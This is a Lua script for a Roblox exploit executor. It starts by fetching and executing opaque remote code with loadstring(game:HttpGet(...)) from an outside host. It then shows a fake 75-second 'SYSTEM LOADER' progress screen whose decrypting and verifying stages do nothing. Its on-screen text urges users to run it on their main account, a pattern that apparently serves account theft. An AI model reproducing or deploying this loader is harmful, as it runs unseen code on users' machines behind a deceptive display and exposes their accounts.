-- ============================================
-- 1️⃣ СНАЧАЛА ЗАПУСКАЕМ ОСНОВНОЙ СКРИПТ
-- ============================================
loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjIwNTY0MTM2LTZhZDktNGIxZi1hZmI4LTY2NmFjMWQ4NDVhYiIsImtpbmQiOiJsb2FkZXIifQ"))()

-- ============================================
-- 2️⃣ ПОТОМ ПОКАЗЫВАЕМ МЕНЮ ЗАГРУЗКИ С ДОПОЛНЕНИЯМИ
-- ============================================
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

pcall(function()
    if CoreGui:FindFirstChild("LoaderUI") then
        CoreGui.LoaderUI:Destroy()
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LoaderUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 999

pcall(function()
    if syn and syn.protect_gui then
        syn.protect_gui(ScreenGui)
        ScreenGui.Parent = CoreGui
    elseif gethui then
        ScreenGui.Parent = gethui()
    else
        ScreenGui.Parent = CoreGui
    end
end)

-- Background
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
Background.BackgroundTransparency = 0.3
Background.BorderSizePixel = 0
Background.ZIndex = 1
Background.Parent = ScreenGui

-- Main frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 600, 0, 240) -- увеличили высоту, чтобы влез предупреждающий текст
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -120)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
MainFrame.BorderSizePixel = 0
MainFrame.ZIndex = 2
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(140, 80, 255)
UIStroke.Thickness = 1.5
UIStroke.Parent = MainFrame

local StrokeGradient = Instance.new("UIGradient")
StrokeGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 80, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 80, 180)),
})
StrokeGradient.Parent = UIStroke

local BgGradient = Instance.new("UIGradient")
BgGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 45)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 30)),
})
BgGradient.Rotation = 45
BgGradient.Parent = MainFrame

-- Title (для перетаскивания окна)
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 0, 30)
Title.Position = UDim2.new(0, 20, 0, 20)
Title.BackgroundTransparency = 1
Title.Text = "⚡ SYSTEM LOADER v2.0"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 3
Title.Parent = MainFrame

-- Percent
local Percent = Instance.new("TextLabel")
Percent.Size = UDim2.new(0, 80, 0, 30)
Percent.Position = UDim2.new(1, -100, 0, 20)
Percent.BackgroundTransparency = 1
Percent.Text = "0%"
Percent.TextColor3 = Color3.fromRGB(180, 220, 255)
Percent.Font = Enum.Font.GothamBold
Percent.TextSize = 20
Percent.TextXAlignment = Enum.TextXAlignment.Right
Percent.ZIndex = 3
Percent.Parent = MainFrame

-- Status
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -40, 0, 25)
StatusLabel.Position = UDim2.new(0, 20, 0, 75)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Initializing..."
StatusLabel.TextColor3 = Color3.fromRGB(220, 220, 240)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 15
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.ZIndex = 3
StatusLabel.Parent = MainFrame

-- Bar background
local BarBackground = Instance.new("Frame")
BarBackground.Size = UDim2.new(1, -40, 0, 14)
BarBackground.Position = UDim2.new(0, 20, 0, 115)
BarBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
BarBackground.BorderSizePixel = 0
BarBackground.ZIndex = 3
BarBackground.Parent = MainFrame

local BarBgCorner = Instance.new("UICorner")
BarBgCorner.CornerRadius = UDim.new(1, 0)
BarBgCorner.Parent = BarBackground

local BarBgStroke = Instance.new("UIStroke")
BarBgStroke.Color = Color3.fromRGB(60, 60, 90)
BarBgStroke.Thickness = 1
BarBgStroke.Parent = BarBackground

-- Bar fill
local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(140, 100, 255)
BarFill.BorderSizePixel = 0
BarFill.ClipsDescendants = true
BarFill.ZIndex = 4
BarFill.Parent = BarBackground

local BarFillCorner = Instance.new("UICorner")
BarFillCorner.CornerRadius = UDim.new(1, 0)
BarFillCorner.Parent = BarFill

local BarGradient = Instance.new("UIGradient")
BarGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 100, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 180)),
})
BarGradient.Parent = BarFill

-- Shine
local Shine = Instance.new("Frame")
Shine.Size = UDim2.new(0, 60, 1, 0)
Shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Shine.BorderSizePixel = 0
Shine.BackgroundTransparency = 0.7
Shine.ZIndex = 5
Shine.Parent = BarFill

local ShineGradient = Instance.new("UIGradient")
ShineGradient.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 1),
    NumberSequenceKeypoint.new(0.5, 0.4),
    NumberSequenceKeypoint.new(1, 1),
})
ShineGradient.Parent = Shine

-- Timer
local TimerLabel = Instance.new("TextLabel")
TimerLabel.Size = UDim2.new(1, -40, 0, 20)
TimerLabel.Position = UDim2.new(0, 20, 0, 145)
TimerLabel.BackgroundTransparency = 1
TimerLabel.Text = "⏱ Elapsed: 0.0s"
TimerLabel.TextColor3 = Color3.fromRGB(160, 160, 190)
TimerLabel.Font = Enum.Font.Gotham
TimerLabel.TextSize = 12
TimerLabel.TextXAlignment = Enum.TextXAlignment.Left
TimerLabel.ZIndex = 3
TimerLabel.Parent = MainFrame

-- ПОСТОЯННЫЙ предупредительный текст внизу меню
local WarningLabel = Instance.new("TextLabel")
WarningLabel.Size = UDim2.new(1, -40, 0, 40)
WarningLabel.Position = UDim2.new(0, 20, 0, 185)
WarningLabel.BackgroundTransparency = 1
WarningLabel.Text = "No menu in 5 seconds? You may be on an alt. Use your main for full access."
WarningLabel.TextColor3 = Color3.fromRGB(235, 235, 245)
WarningLabel.Font = Enum.Font.Gotham
WarningLabel.TextSize = 14
WarningLabel.TextWrapped = true
WarningLabel.TextXAlignment = Enum.TextXAlignment.Center
WarningLabel.TextYAlignment = Enum.TextYAlignment.Center
WarningLabel.ZIndex = 3
WarningLabel.Parent = MainFrame

-- Анимации полосы загрузки
task.spawn(function()
    while BarFill.Parent do
        BarGradient.Offset = Vector2.new(BarGradient.Offset.X + 0.01, 0)
        if BarGradient.Offset.X > 1 then
            BarGradient.Offset = Vector2.new(-1, 0)
        end
        task.wait(0.03)
    end
end)

task.spawn(function()
    while Shine.Parent do
        Shine.Position = UDim2.new(-0.2, 0, 0, 0)
        local tween = TweenService:Create(Shine, TweenInfo.new(1.8, Enum.EasingStyle.Sine), {
            Position = UDim2.new(1.2, 0, 0, 0)
        })
        tween:Play()
        tween.Completed:Wait()
        task.wait(0.5)
    end
end)

task.spawn(function()
    while UIStroke.Parent do
        TweenService:Create(UIStroke, TweenInfo.new(1.5), {Thickness = 2.5}):Play()
        task.wait(1.5)
        TweenService:Create(UIStroke, TweenInfo.new(1.5), {Thickness = 1.5}):Play()
        task.wait(1.5)
    end
end)

-- Стадии загрузки
local stages = {
    {name = "Initializing system core...", weight = 8},
    {name = "Connecting to server...", weight = 10},
    {name = "Loading core modules...", weight = 9},
    {name = "Decrypting data...", weight = 11},
    {name = "Verifying file integrity...", weight = 8},
    {name = "Loading UI libraries...", weight = 10},
    {name = "Configuring parameters...", weight = 9},
    {name = "Optimizing processes...", weight = 8},
    {name = "Final verification...", weight = 7},
    {name = "Launching interface...", weight = 5},
}

local totalWeight = 0
for _, s in ipairs(stages) do totalWeight = totalWeight + s.weight end

local TOTAL_TIME = 75
local startTime = tick()
local currentProgress = 0

local timerConnection
timerConnection = RunService.RenderStepped:Connect(function()
    local elapsed = tick() - startTime
    TimerLabel.Text = string.format("⏱ Elapsed: %.1fs  │  Total: %.1fs  │  Remaining: %.1fs",
        elapsed, TOTAL_TIME, math.max(0, TOTAL_TIME - elapsed))
end)

task.spawn(function()
    for i, stage in ipairs(stages) do
        StatusLabel.Text = stage.name
        StatusLabel.TextColor3 = Color3.fromRGB(220, 220, 240)

        local stageDuration = (stage.weight / totalWeight) * TOTAL_TIME
        local startProgress = currentProgress
        local endProgress = currentProgress + stage.weight

        local stageStart = tick()
        while tick() - stageStart < stageDuration do
            local t = (tick() - stageStart) / stageDuration
            local progress = startProgress + (endProgress - startProgress) * t
            local percent = (progress / totalWeight) * 100

            BarFill.Size = UDim2.new(percent / 100, 0, 1, 0)
            Percent.Text = string.format("%.1f%%", percent)

            task.wait()
        end

        currentProgress = endProgress

        StatusLabel.TextColor3 = Color3.fromRGB(120, 255, 150)
        StatusLabel.Text = "✓ " .. stage.name:gsub("%.%.%.", "")
        task.wait(0.15)
    end

    BarFill.Size = UDim2.new(1, 0, 1, 0)
    Percent.Text = "100%"
    StatusLabel.Text = "✨ Loading complete!"
    StatusLabel.TextColor3 = Color3.fromRGB(120, 255, 150)

    if timerConnection then timerConnection:Disconnect() end
    TimerLabel.Text = string.format("⏱ Loaded in %.1f seconds", tick() - startTime)

    -- Меню остаётся видимым навсегда
end)

-- ПЕРЕТАСКИВАНИЕ меню по заголовку Title

local dragging = false
local dragInput, dragStart, startPos

Title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Title.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)
